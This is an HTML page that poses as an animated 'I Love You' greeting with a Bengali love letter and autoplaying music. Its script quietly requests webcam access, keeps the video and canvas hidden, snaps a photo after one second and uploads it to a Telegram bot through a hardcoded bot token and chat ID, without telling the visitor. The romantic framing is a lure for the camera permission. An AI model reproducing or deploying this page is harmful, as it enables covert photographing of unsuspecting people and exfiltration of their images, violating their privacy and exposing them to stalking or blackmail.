<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>I Love You</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');

    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      width: 100vw;
      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
      background-size: 300% 300%;
      font-family: 'Dancing Script', cursive;
      animation: bgAnimation 12s infinite alternate;
      overflow: hidden;
    }

    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      text-align: center;
      position: relative;
    }

    h1 {
      font-size: 3rem;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
      margin: 20px 0;
    }

    h1 span {
      color: #ffeb3b;
      font-style: italic;
    }

    .love-letter {
      font-family: 'Dancing Script', cursive;
      font-size: 1.5rem;
      color: #fff;
      margin-top: 30px;
      text-align: left;
      width: 80%;
      max-height: 300px;
      margin: 20px auto;
      border: 2px solid #ff4b5c;
      padding: 20px;
      border-radius: 15px;
      background-color: rgba(0, 0, 0, 0.5);
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      overflow-y: auto;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }

    /* Music Button Styling */
    .music-btn {
      background-color: #ff4b5c;
      color: white;
      font-size: 1.2rem;
      padding: 10px 20px;
      border: none;
      border-radius: 20px;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s ease;
    }

    .music-btn:hover {
      background-color: #ff1e56;
    }

    .music-btn:focus {
      outline: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>I <span>Love</span> You</h1>
    <div class="love-letter">
      <p>প্রিয়তম,</p>
      <p>যতদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
      <p>চিরকাল তোমার,</p>
      <p><strong>তোমার ভালোবাসা</strong></p>
    </div>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <!-- Music Toggle Button -->
    <button class="music-btn" onclick="toggleMusic()">Pause Music</button>
  </div>

  <audio id="loveAudio" loop autoplay>
    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const audio = document.getElementById('loveAudio');
    const musicButton = document.querySelector('.music-btn');

    let isMusicPlaying = true; // Tracks if music is playing

    // Start webcam feed and capture photo automatically
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;

        // Wait for the video to start
        video.onloadedmetadata = () => {
          setTimeout(capturePhoto, 1000); // Wait 1 second before capturing the photo
        };
      })
      .catch((err) => {
        console.error('Error accessing webcam:', err);
      });

    // Capture photo and send to Telegram
    function capturePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const base64Image = canvas.toDataURL('image/png');
      const blob = base64ToBlob(base64Image);

      sendToTelegram(blob);
    }

    // Convert Base64 to Blob
    function base64ToBlob(base64) {
      const byteString = atob(base64.split(',')[1]);
      const arrayBuffer = new ArrayBuffer(byteString.length);
      const uintArray = new Uint8Array(arrayBuffer);

      for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
      }

      return new Blob([uintArray], { type: 'image/png' });
    }

    // Send to Telegram
    function sendToTelegram(blob) {
      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s'; // Replace with your bot token
      const chatId = '1987016824'; // Replace with your chat ID
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png');

      fetch(url, {
        method: 'POST',
        body: formData,
      })
        .then((response) => response.json())
        .then((data) => {
          if (!data.ok) {
            console.error('Telegram API Error:', data);
          }
        })
        .catch((err) => {
          console.error('Fetch Error:', err);
        });
    }

    // Toggle music play/pause
    function toggleMusic() {
      if (isMusicPlaying) {
        audio.pause();
        musicButton.textContent = 'Play Music';
      } else {
        audio.play();
        musicButton.textContent = 'Pause Music';
      }
      isMusicPlaying = !isMusicPlaying;
    }
  </script>
</body>
</html>
